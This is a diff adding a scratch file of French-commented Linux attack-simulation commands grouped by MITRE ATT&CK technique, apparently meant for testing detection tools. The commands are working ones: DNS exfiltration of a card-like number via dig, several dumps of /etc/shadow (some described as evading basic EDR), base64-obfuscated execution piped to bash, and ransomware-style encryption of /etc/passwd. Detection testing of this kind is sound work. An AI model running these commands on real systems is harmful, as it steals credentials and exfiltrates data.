@@ -1,0 +1,47 @@
+C. Technique T1048 (Exfiltration DNS - via dig)
+# Simule l'envoi d'une donnée secrète (ex: numéro de carte bancaire) via DNS
+secret="4500-1234-5678-9012"
+dig @8.8.8.8 $(echo "$secret" | base64).google.com
+
+A. Technique T1003.008 (Vol d'identifiants)
+
+# Test 1 : Lecture directe (le classique)
+sudo cat /etc/shadow > /tmp/shadow_dump.txt
+
+# Test 2 : Utilisation d'un outil détourné (ed) pour être discret
+echo -e "e /etc/shadow\n,p\n" | ed > /tmp/shadow_ed.txt
+
+# Test 1 : Lecture directe via cat (le plus commun)
+sudo cat /etc/shadow > /tmp/T1003.txt
+
+# Test 2 : Utilisation de l'éditeur 'ed' (plus discret, trompe les EDR basiques)
+echo -e "e /etc/passwd\n,p\ne /etc/shadow\n,p\n" | ed > /tmp/T1003_ed.txt
+
+# Test 3 : Utilisation d'une boucle shell (pas de binaire 'cat', très dur à voir)
+while read line; do echo $line >> /tmp/T1003_builtin.txt; done < /etc/shadow
+
+B. Technique T1059.004 (Scripts Malveillants)
+# Test 1 : Création et exécution d'un script temporaire
+TMPFILE=$(mktemp)
+echo "echo 'Attaque en cours...'; ping -c 2 8.8.8.8" > $TMPFILE
+bash $TMPFILE
+
+# Test 2 : Commande obfusquée en Base64 (très utilisé par les hackers)
+# Cela décode "id" et l'exécute.
+echo "aWQ=" | base64 -d | bash
+
+
+2. Technique T1486 (Ransomware / Chiffrement)
+
+# Test 1 : Chiffrement avec GPG (Standard)
+# On simule le chiffrement du fichier passwd
+echo "passwd123" | gpg --batch --yes --passphrase-fd 0 --cipher-algo AES-256 -o /tmp/passwd.gpg -c /etc/passwd
+
+# Test 2 : Chiffrement avec OpenSSL (Très courant dans les malwares Linux)
+# On génère une clé et on chiffre le fichier
+openssl genrsa -out /tmp/key.pem 2048
+openssl rsa -in /tmp/key.pem -pubout -out /tmp/pub.pem
+openssl rsautl -encrypt -inkey /tmp/pub.pem -pubin -in /etc/passwd -out /tmp/passwd.enc
+
+# Test 3 : Archivage chiffré avec 7zip
+7z a -ppasswd123 /tmp/passwd.7z /etc/passwd
